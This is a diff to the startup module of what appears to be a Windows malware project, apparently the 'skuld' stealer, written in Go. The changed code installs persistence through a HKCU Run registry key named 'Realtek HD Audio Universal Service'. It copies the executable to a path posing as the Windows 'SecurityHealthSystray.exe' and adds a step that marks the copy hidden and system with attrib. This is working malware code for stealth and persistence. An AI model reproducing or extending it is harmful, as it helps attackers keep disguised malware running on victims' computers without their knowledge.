@@ -3,9 +3,9 @@ package startup
 import (
 	"golang.org/x/sys/windows/registry"
 	"os"
+	"os/exec"
 
 	"github.com/hackirby/skuld/utils/fileutil"
-	"github.com/hackirby/skuld/utils/program"
 )
 
 func Run() error {
@@ -14,20 +14,18 @@ func Run() error {
 		return err
 	}
 
-	path := "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityHealthSystray.exe"
-	if !program.IsElevated() {
-		path = os.Getenv("APPDATA") + "\\Microsoft\\Protect\\SecurityHealthSystray.exe"
-		key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
-		if err != nil {
-			return err
-		}
+	key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
+	if err != nil {
+		return err
+	}
 
-		defer key.Close()
+	defer key.Close()
 
-		err = key.SetStringValue("Realtek HD Audio Universal Service", path)
-		if err != nil {
-			return err
-		}
+	path := os.Getenv("APPDATA") + "\\Microsoft\\Protect\\SecurityHealthSystray.exe"
+
+	err = key.SetStringValue("Realtek HD Audio Universal Service", path)
+	if err != nil {
+		return err
 	}
 
 	if fileutil.Exists(path) {
@@ -38,5 +36,9 @@ func Run() error {
 	}
 
 	err = fileutil.CopyFile(exe, path)
-	return err
+	if err != nil {
+		return err
+	}
+
+	return exec.Command("attrib", "+h", "+s", path).Run()
 }
